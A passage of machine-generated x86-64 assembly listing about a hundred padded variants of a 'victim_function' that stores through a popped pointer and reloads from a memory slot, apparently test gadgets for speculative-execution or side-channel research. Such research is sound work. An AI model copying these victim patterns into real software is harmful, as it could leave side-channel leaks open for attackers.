.Lvictim_function_win0_var1606:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1607
.Lvictim_function_win0_var1607:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1608
.Lvictim_function_win0_var1608:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1609
.Lvictim_function_win0_var1609:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1610
.Lvictim_function_win0_var1610:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1611
.Lvictim_function_win0_var1611:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1612
.Lvictim_function_win0_var1612:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1613
.Lvictim_function_win0_var1613:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1614
.Lvictim_function_win0_var1614:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1615
.Lvictim_function_win0_var1615:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1616
.Lvictim_function_win0_var1616:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1617
.Lvictim_function_win0_var1617:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1618
.Lvictim_function_win0_var1618:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1619
.Lvictim_function_win0_var1619:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1620
.Lvictim_function_win0_var1620:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1621
.Lvictim_function_win0_var1621:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1622
.Lvictim_function_win0_var1622:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1623
.Lvictim_function_win0_var1623:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1624
.Lvictim_function_win0_var1624:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1625
.Lvictim_function_win0_var1625:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1626
.Lvictim_function_win0_var1626:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1627
.Lvictim_function_win0_var1627:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1628
.Lvictim_function_win0_var1628:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1629
.Lvictim_function_win0_var1629:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1630
.Lvictim_function_win0_var1630:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1631
.Lvictim_function_win0_var1631:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1632
.Lvictim_function_win0_var1632:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1633
.Lvictim_function_win0_var1633:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1634
.Lvictim_function_win0_var1634:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1635
.Lvictim_function_win0_var1635:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1636
.Lvictim_function_win0_var1636:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1637
.Lvictim_function_win0_var1637:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1638
.Lvictim_function_win0_var1638:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	mfence
	mfence
	nop
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1639
.Lvictim_function_win0_var1639:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1640
.Lvictim_function_win0_var1640:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1641
.Lvictim_function_win0_var1641:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1642
.Lvictim_function_win0_var1642:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1643
.Lvictim_function_win0_var1643:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1644
.Lvictim_function_win0_var1644:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1645
.Lvictim_function_win0_var1645:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1646
.Lvictim_function_win0_var1646:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1647
.Lvictim_function_win0_var1647:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1648
.Lvictim_function_win0_var1648:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1649
.Lvictim_function_win0_var1649:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1650
.Lvictim_function_win0_var1650:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1651
.Lvictim_function_win0_var1651:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1652
.Lvictim_function_win0_var1652:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1653
.Lvictim_function_win0_var1653:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1654
.Lvictim_function_win0_var1654:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1655
.Lvictim_function_win0_var1655:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1656
.Lvictim_function_win0_var1656:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1657
.Lvictim_function_win0_var1657:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1658
.Lvictim_function_win0_var1658:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1659
.Lvictim_function_win0_var1659:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1660
.Lvictim_function_win0_var1660:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1661
.Lvictim_function_win0_var1661:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1662
.Lvictim_function_win0_var1662:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1663
.Lvictim_function_win0_var1663:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1664
.Lvictim_function_win0_var1664:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1665
.Lvictim_function_win0_var1665:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1666
.Lvictim_function_win0_var1666:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1667
.Lvictim_function_win0_var1667:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1668
.Lvictim_function_win0_var1668:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1669
.Lvictim_function_win0_var1669:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1670
.Lvictim_function_win0_var1670:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1671
.Lvictim_function_win0_var1671:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1672
.Lvictim_function_win0_var1672:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1673
.Lvictim_function_win0_var1673:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1674
.Lvictim_function_win0_var1674:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1675
.Lvictim_function_win0_var1675:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1676
.Lvictim_function_win0_var1676:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1677
.Lvictim_function_win0_var1677:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1678
.Lvictim_function_win0_var1678:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1679
.Lvictim_function_win0_var1679:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1680
.Lvictim_function_win0_var1680:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1681
.Lvictim_function_win0_var1681:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1682
.Lvictim_function_win0_var1682:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1683
.Lvictim_function_win0_var1683:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1684
.Lvictim_function_win0_var1684:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1685
.Lvictim_function_win0_var1685:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1686
.Lvictim_function_win0_var1686:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1687
.Lvictim_function_win0_var1687:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1688
.Lvictim_function_win0_var1688:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1689
.Lvictim_function_win0_var1689:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1690
.Lvictim_function_win0_var1690:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1691
.Lvictim_function_win0_var1691:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1692
.Lvictim_function_win0_var1692:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1693
.Lvictim_function_win0_var1693:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1694
.Lvictim_function_win0_var1694:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1695
.Lvictim_function_win0_var1695:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1696
.Lvictim_function_win0_var1696:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1697
.Lvictim_function_win0_var1697:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	nop
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1698
.Lvictim_function_win0_var1698:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1699
.Lvictim_function_win0_var1699:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1700
.Lvictim_function_win0_var1700:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1701
.Lvictim_function_win0_var1701:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1702
.Lvictim_function_win0_var1702:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1703
.Lvictim_function_win0_var1703:
	popq	%rax
